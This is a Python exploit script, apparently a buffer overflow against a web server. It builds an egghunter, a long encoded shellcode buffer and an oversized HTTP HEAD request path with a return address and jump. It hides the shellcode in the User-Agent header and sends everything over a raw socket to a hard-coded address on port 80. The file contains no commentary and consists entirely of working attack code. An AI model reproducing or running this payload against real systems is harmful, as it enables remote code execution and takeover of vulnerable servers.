import socket
import os
import sys
 
#Egghunter
#Size 32-bytes
hunter = (
"\x66\x81\xca\xff"
"\x0f\x42\x52\x6a"
"\x02\x58\xcd\x2e"
"\x3c\x05\x5a\x74"
"\xef\xb8\x6e\x75" #nu
"\x6c\x6c\x8b\xfa" #ul
"\xaf\x75\xea\xaf"
"\x75\xe7\xff\xe7")
 

buf =  ""
buf += "\x89\xe0\xdd\xc5\xd9\x70\xf4\x5b\x53\x59\x49\x49\x49"
buf += "\x49\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43"
buf += "\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b\x41"
buf += "\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42"
buf += "\x58\x50\x38\x41\x42\x75\x4a\x49\x49\x6c\x6d\x38\x4b"
buf += "\x32\x33\x30\x63\x30\x57\x70\x73\x50\x6d\x59\x6b\x55"
buf += "\x70\x31\x49\x50\x70\x64\x6c\x4b\x50\x50\x54\x70\x4c"
buf += "\x4b\x33\x62\x66\x6c\x6c\x4b\x76\x32\x64\x54\x4e\x6b"
buf += "\x44\x32\x34\x68\x66\x6f\x4c\x77\x73\x7a\x31\x36\x35"
buf += "\x61\x39\x6f\x4e\x4c\x77\x4c\x35\x31\x51\x6c\x77\x72"
buf += "\x64\x6c\x75\x70\x49\x51\x38\x4f\x64\x4d\x63\x31\x4a"
buf += "\x67\x4a\x42\x78\x72\x72\x72\x32\x77\x4c\x4b\x56\x32"
buf += "\x54\x50\x4c\x4b\x43\x7a\x55\x6c\x6c\x4b\x62\x6c\x52"
buf += "\x31\x54\x38\x6a\x43\x63\x78\x75\x51\x6e\x31\x73\x61"
buf += "\x6c\x4b\x50\x59\x31\x30\x36\x61\x58\x53\x4c\x4b\x62"
buf += "\x69\x64\x58\x48\x63\x45\x6a\x43\x79\x4c\x4b\x54\x74"
buf += "\x6e\x6b\x75\x51\x4a\x76\x65\x61\x69\x6f\x4e\x4c\x79"
buf += "\x51\x7a\x6f\x74\x4d\x73\x31\x58\x47\x65\x68\x59\x70"
buf += "\x53\x45\x5a\x56\x37\x73\x71\x6d\x4a\x58\x77\x4b\x53"
buf += "\x4d\x55\x74\x43\x45\x5a\x44\x71\x48\x4e\x6b\x52\x78"
buf += "\x54\x64\x33\x31\x48\x53\x53\x56\x6e\x6b\x64\x4c\x42"
buf += "\x6b\x6e\x6b\x66\x38\x67\x6c\x46\x61\x49\x43\x4c\x4b"
buf += "\x57\x74\x6c\x4b\x75\x51\x38\x50\x6c\x49\x73\x74\x75"
buf += "\x74\x56\x44\x71\x4b\x51\x4b\x45\x31\x42\x79\x43\x6a"
buf += "\x43\x61\x39\x6f\x4b\x50\x73\x6f\x51\x4f\x71\x4a\x4c"
buf += "\x4b\x46\x72\x68\x6b\x6c\x4d\x53\x6d\x45\x38\x35\x63"
buf += "\x30\x32\x73\x30\x73\x30\x32\x48\x73\x47\x33\x43\x35"
buf += "\x62\x31\x4f\x52\x74\x63\x58\x42\x6c\x43\x47\x37\x56"
buf += "\x53\x37\x49\x6f\x48\x55\x4e\x58\x6e\x70\x47\x71\x65"
buf += "\x50\x33\x30\x56\x49\x48\x44\x61\x44\x70\x50\x72\x48"
buf += "\x31\x39\x6f\x70\x50\x6b\x73\x30\x4b\x4f\x4e\x35\x50"
buf += "\x6a\x45\x58\x70\x59\x32\x70\x4b\x52\x39\x6d\x51\x50"
buf += "\x46\x30\x43\x70\x42\x70\x75\x38\x4b\x5a\x34\x4f\x79"
buf += "\x4f\x79\x70\x49\x6f\x6e\x35\x4f\x67\x42\x48\x46\x62"
buf += "\x77\x70\x46\x65\x46\x59\x4e\x69\x4b\x56\x30\x6a\x56"
buf += "\x70\x66\x36\x43\x67\x73\x58\x49\x52\x79\x4b\x57\x47"
buf += "\x50\x67\x39\x6f\x69\x45\x76\x37\x50\x68\x78\x37\x68"
buf += "\x69\x45\x68\x79\x6f\x49\x6f\x4e\x35\x46\x37\x42\x48"
buf += "\x74\x34\x6a\x4c\x35\x6b\x4b\x51\x59\x6f\x6a\x75\x73"
buf += "\x67\x4f\x67\x33\x58\x70\x75\x50\x6e\x50\x4d\x30\x61"
buf += "\x69\x6f\x78\x55\x73\x58\x75\x33\x52\x4d\x63\x54\x73"
buf += "\x30\x6d\x59\x6a\x43\x42\x77\x56\x37\x43\x67\x34\x71"
buf += "\x7a\x56\x71\x7a\x42\x32\x31\x49\x36\x36\x6b\x52\x69"
buf += "\x6d\x32\x46\x49\x57\x47\x34\x65\x74\x77\x4c\x45\x51"
buf += "\x47\x71\x6c\x4d\x73\x74\x57\x54\x44\x50\x4f\x36\x33"
buf += "\x30\x72\x64\x70\x54\x50\x50\x42\x76\x62\x76\x52\x76"
buf += "\x70\x46\x71\x46\x62\x6e\x76\x36\x32\x76\x76\x33\x53"
buf += "\x66\x51\x78\x54\x39\x68\x4c\x35\x6f\x4f\x76\x59\x6f"
buf += "\x38\x55\x6d\x59\x6d\x30\x72\x6e\x30\x56\x57\x36\x79"
buf += "\x6f\x46\x50\x75\x38\x34\x48\x4e\x67\x37\x6d\x55\x30"
buf += "\x4b\x4f\x7a\x75\x6f\x4b\x58\x70\x4e\x55\x69\x32\x36"
buf += "\x36\x62\x48\x79\x36\x4e\x75\x4d\x6d\x6d\x4d\x39\x6f"
buf += "\x6a\x75\x35\x6c\x43\x36\x61\x6c\x35\x5a\x6b\x30\x69"
buf += "\x6b\x59\x70\x50\x75\x64\x45\x6f\x4b\x32\x67\x65\x43"
buf += "\x64\x32\x32\x4f\x32\x4a\x75\x50\x71\x43\x59\x6f\x59"
buf += "\x45\x41\x41"

 
Stage1 = "A"*478 + hunter + "A"*5 + "\x59\x54\xC3\x77" + "\xEB\xC4"
Stage2 = "nullnull" + buf
 
buffer = (
"HEAD /" + Stage1 + " HTTP/1.1\r\n"
"Host: 192.168.0.106:80\r\n"
"User-Agent: " + Stage2 + "\r\n"
"Keep-Alive: 115\r\n"
"Connection: keep-alive\r\n\r\n")
 
expl = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
expl.connect(("192.168.43.229", 80))
expl.send(buffer)
expl.close()
